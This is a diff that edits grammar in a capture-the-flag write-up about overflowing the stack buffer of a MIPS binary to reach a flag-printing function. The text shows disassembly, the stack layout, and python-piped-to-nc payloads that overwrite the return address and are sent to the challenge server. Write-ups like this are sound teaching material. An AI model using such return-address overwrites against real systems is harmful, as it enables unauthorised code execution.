@@ -11,23 +11,24 @@ STOP GAN (**pwn**)
     
 
 Zip-file contains some executable `bof` and some C source code 
-`console.c`. From source code we can read that our first goal is simply 
-overflow buffer of `bof` binary, which is run by `console` program.
-Also, from `console.c` it looks like `bof` is MIPS binary, check it:
+`console.c`. From source code we can read that our first goal is to 
+simply overflow buffer of `bof` binary, which is run by `console` 
+program. Also, from `console.c` it looks like `bof` is MIPS binary, 
+check it:
 
     $ file ./bof
     ./bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
 
-Typically on x86/amd64/arm system you need `qemu-mipsel` to run such 
-executables, and `console.c` tries do it. But it is not necessary 
+Typically on x86/amd64 system you need `qemu-mipsel` to run such 
+executables, and `console.c` tries to do it. But it is not necessary 
 to compile `console.c`, because qemu can be invoked manually:
 
     $ qemu-mipsel ./bof
     Cauliflower systems never crash >>
     hello
 
-Okay, it is must be very easy just to overflow buffer. Say, 1 kb 
-should be enough:
+Okay, it must be very easy just to overflow the buffer. Say, 1 kb 
+should be enough in most cases:
 
     $ python -c "print('A'*1024)" | qemu-mipsel ./bof
     Cauliflower systems never crash >>
@@ -35,8 +36,8 @@ should be enough:
     qemu-mipsel: /build/qemu-DqynNa/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion `!have_tb_lock' failed.
     Segmentation fault
 
-And now we should send it to the given address (not to forget prepend 
-trash with 'run' command for `console` program):
+And now we should send it to the given address (do not forget prepend 
+trash with 'run' command for `console` wrapper):
 
     $ python -c "print('run\n'+'A'*1024)" | nc buffer-overflow.ctfcompetition.com 1337
     Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
@@ -59,10 +60,10 @@ Here is first flag:
 **CTF{Why_does_cauliflower_threaten_us}**
 
 
-Now next to the second flag. Use radare2 for it. As MIPS instruction 
-set can looked unfamiliar, one can turn on disasm descriptions to ease 
+Now to the second flag. Use radare2 for it. As MIPS instruction 
+set can looks unfamiliar, one can turn on disasm descriptions to ease 
 understanding of what is going on. Essentially, the buffer overflow 
-exploitation must not differ significally from those of x86 
+exploitation must not differ significantly from those of x86 
 architecture. Because with MIPS we have almost exactly the same: 
 
   - *stack* that is contigous block of memory;
@@ -135,11 +136,11 @@ Some disassembling:
     \           0x00400a04      00000000       nop                         ; no operation
     [0x00400530]> 
 
-Important things are:
+Important things to note:
 
   - `main` function uses 0x128 = 296 bytes of stack in total, from which:
   - 4 bytes are used for return address `ra` (in the end it is loaded 
-  from stack and program just jamped to this address - see 
+  from stack and program just jumps to this address - see 
   `lw ra, (var_124h)` and `jr ra`)
   - 4 bytes are used for stack frame pointer `fp` (which also will be 
   restored before returning from `main`)
@@ -161,7 +162,7 @@ and beyond it's boundaries):
     | char dummy[28] | char buf[260] |    fp    |    ra   | <caller's locals> | ...
      -------------------------------------------------------------------------
 
-Check our suggestions (remember that `scanf()` also writes 
+Do check our suggestions (remember that `scanf()` also writes 
 NULL-termination character to the end of the buffer, so actual number 
 of written bytes are one plus size of input):
 
@@ -226,9 +227,9 @@ bytes). Let's look into `sym.local_flag` itself:
     \           0x00400890      00000000       nop                         ; no operation
 
 
-Yeah, this is our day! Let's take address `0x00400858`, I like it 
-because it restores `fp` value for something useful and we must not 
-think a lot about what to write to it.
+Let's take address `0x00400858`, I like it because it restores `fp` 
+with some useful value and we must not think a lot about what to 
+write to it.
 All pieces together: 260 bytes of trash, 4 bytes of more trash 
 (because `fp` will be overwritten very soon) and 4 bytes of return 
 address to `0x00400858` (remember byte ordering, it is 58:08:40:00 in 
@@ -243,8 +244,8 @@ Try it:
 
 Notice that there is no segmentation fault, the program thinks that 
 everything is Ok. And there is message that it tries but could not open 
-a flag tells us that we are on the right way. Check it with remote 
-server:
+a flag. This tells us that we are on the right way. Check it with 
+remote server:
 
     $ python -c "print('run\n' + 'A'*260 + 'A'*4 + '\x58\x08\x40')" | nc buffer-overflow.ctfcompetition.com 1337
     Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
